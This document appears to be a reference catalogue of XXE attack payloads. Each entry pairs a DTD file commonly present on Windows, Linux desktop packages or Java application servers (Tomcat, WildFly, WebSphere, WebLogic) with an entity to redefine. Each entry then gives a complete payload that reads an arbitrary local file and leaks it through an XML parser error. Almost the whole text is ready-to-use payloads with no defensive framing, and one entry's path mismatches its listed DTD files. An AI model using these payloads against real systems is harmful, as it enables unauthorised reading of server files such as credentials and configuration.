# XXE payloads for specific DTDs

**DTD File:** `/C:\Windows\System32\wbem\xml\cim20.dtd`

**Injectable entity:** `%CIMName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">

    <!ENTITY % CIMName '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/C:\Windows\System32\wbem\xml\wmi20.dtd`

**Injectable entity:** `%CIMName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\wmi20.dtd">

    <!ENTITY % CIMName '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/C:\Program Files (x86)\Lotus\Notes\domino.dtd`

**Injectable entity:** `%boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Program Files (x86)\Lotus\Notes\domino.dtd">

    <!ENTITY % boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/C:\Windows\System32\xwizard.dtd`

**Injectable entity:** `%onerrortypes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\xwizard.dtd">

    <!ENTITY % onerrortypes '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/yelp/dtd/docbookx.dtd`

**Injectable entity:** `%ISOamsa`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd`

**Injectable entity:** `%URI`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">

    <!ENTITY % URI '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd`

**Injectable entity:** `%Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`

**Injectable entity:** `%url.attribute.set`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">

    <!ENTITY % url.attribute.set '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd`

**Injectable entity:** `%condition`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">

    <!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 


**DTD File:** `/usr/share/xml/fontconfig/fonts.dtd`

**Injectable entity:** `%constant`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/struts/struts-config_1_1.dtd`

**Injectable entity:** `%AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/struts/struts-config_1_1.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd`

**Injectable entity:** `%AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/struts-config_1_2.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```
 ---

**DTD File:** `/usr/share/gtksourceview-4/language-specs/language.dtd`

**Injectable entity:** `%itemattrs`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-4/language-specs/language.dtd">

    <!ENTITY % itemattrs '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd`

**Injectable entity:** `%n.InProceedings`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd">

    <!ENTITY % n.InProceedings 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/boostbook/dtd/boostbook.dtd`

**Injectable entity:** `%boost.common.attrib`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/boostbook/dtd/boostbook.dtd">

    <!ENTITY % boost.common.attrib '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 


**DTD File:** `/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd`

**Injectable entity:** `%queries`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">

    <!ENTITY % queries 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd`

**Injectable entity:** `%publicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///opt/jboss/wildfly/modules/system/layers/base/org/apache/xml-resolver/main/xml-resolver-1.2.jar!/org/apache/xml/resolver/etc/catalog.dtd">

    <!ENTITY % publicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/nmap/nmap.dtd`

**Injectable entity:** `%attr_numeric`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/nmap/nmap.dtd">

    <!ENTITY % attr_numeric '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/liteide/liteeditor/kate/language.dtd`

**Injectable entity:** `%commonAttributes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/liteide/liteeditor/kate/language.dtd">

    <!ENTITY % commonAttributes '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/libgweather/locations.dtd`

**Injectable entity:** `%name`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgweather/locations.dtd">

    <!ENTITY % name 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/libgda-5.0/dtd/libgda-server-operation.dtd`

**Injectable entity:** `%paramlist-dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-server-operation.dtd">

    <!ENTITY % paramlist-dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/libgda-5.0/dtd/libgda-paramlist.dtd`

**Injectable entity:** `%array-dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/libgda-5.0/dtd/libgda-paramlist.dtd">

    <!ENTITY % array-dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/xml/docutils/docutils.dtd`

**Injectable entity:** `%measure`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docutils/docutils.dtd">

    <!ENTITY % measure '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/dblatex/schema/dblatex-config.dtd`

**Injectable entity:** `%attlist.modname`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/dblatex/schema/dblatex-config.dtd">

    <!ENTITY % attlist.modname '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd`

**Injectable entity:** `%common`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd">

    <!ENTITY % block "xxx" >

    <!ENTITY % common '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd`

**Injectable entity:** `%xs-datatypes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd">

    <!ENTITY % xs-datatypes '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/sgml/dtd/xml-core/catalog.dtd`

**Injectable entity:** `publicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/sgml/dtd/xml-core/catalog.dtd">

    <!ENTITY % publicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

---

**DTD File:** `/usr/share/xml/schema/xml-core/catalog.dtd`

**Injectable entity:** `partialPublicIdentifier`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/schema/xml-core/catalog.dtd">

    <!ENTITY % partialPublicIdentifier '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/etc/vmware-tools/vgauth/schemas/XMLSchema.dtd`

**Injectable entity:** `xs-datatypes`

**XXE Payload:**

```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///etc/vmware-tools/vgauth/schemas/XMLSchema.dtd">

    <!ENTITY % xs-datatypes '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:**
 - `/usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport-0.2.dtd`
 - `/usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport-0.3.dtd`
 - `/usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport.dtd`
 - `/usr/share/perfsuite/dtds/pshwpc/hwpcreport-0.3.dtd`
 - `/usr/share/perfsuite/dtds/pshwpc/hwpcreport.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport-0.2.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:**
 - `/usr/share/perfsuite/dtds/pshwpc/multihwpcprofilereport-0.2.dtd`
 - `/usr/share/perfsuite/dtds/pshwpc/multihwpcprofilereport-0.3.dtd`

**Injectable entity:** `hwpcprofilereport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/multihwpcprofilereport-0.2.dtd">

    <!ENTITY % hwpcprofilereport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:**
 - `/usr/share/perfsuite/dtds/pshwpc/multihwpcreport-0.3.dtd`
 - `/usr/share/perfsuite/dtds/pshwpc/multihwpcreport.dtd`

**Injectable entity:** `hwpcreport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/multihwpcreport-0.3.dtd">

    <!ENTITY % hwpcreport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/perfsuite/dtds/pshwpc/psmetrics.dtd`

**Injectable entity:** `expr`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/psmetrics.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 ---

**DTD File:** `/usr/lib/libreoffice/share/dtd/officedocument/1_0/accelerator.dtd`

**Injectable entity:** `boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/lib/libreoffice/share/dtd/officedocument/1_0/accelerator.dtd">

    <!ENTITY % boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:**
 - `/usr/share/paros/xml/alert.dtd`
 - `/usr/share/zaproxy/xml/alert.dtd`

**Injectable entity:** `alertDef`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/zaproxy/xml/alert.dtd">

    <!ENTITY % alertDef '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd`

**Injectable entity:** `n.InProceedings`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd">

    <!ENTITY % n.InProceedings 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** 
 - `/usr/share/boostbook/dtd/1.1/boostbook.dtd`
 - `/usr/share/boostbook/dtd/boostbook.dtd`

**Injectable entity:** `boost.common.attrib`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Code\projects\dtd-finder\samples\new\boostbook.dtd">

    <!ENTITY % boost.common.attrib '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/doc/libxml-libxml-perl/examples/complex/complex.dtd`

**Injectable entity:** `f`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/doc/libxml-libxml-perl/examples/complex/complex.dtd">

    <!ENTITY % f '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `/usr/share/doc/libxml-libxml-perl/examples/complex/dtd/f.dtd`

**Injectable entity:** `g`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/doc/libxml-libxml-perl/examples/complex/dtd/f.dtd">

    <!ENTITY % g '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** 
 - `/usr/share/xml/docbook/stylesheet/docbook-xsl/common/l10n.dtd`
 - `/usr/share/xml/docbook/xsl-stylesheets-1.79.2/common/l10n.dtd`
 - `/usr/share/xml/docbook/xsl-stylesheets-1.79.2-nons/common/l10n.dtd`

**Injectable entity:** `xmlns`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/docbook/stylesheet/docbook-xsl/common/l10n.dtd">

    <!ENTITY % xmlns '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** 
 - `/usr/share/gtksourceview-2.0/language-specs/language.dtd`
 - `/usr/share/gtksourceview-3.0/language-specs/language.dtd`
 - `/usr/share/gtksourceview-4/language-specs/language.dtd`


**Injectable entity:** `commonAttributes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/gtksourceview-2.0/language-specs/language.dtd">

    <!ENTITY % commonAttributes '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```
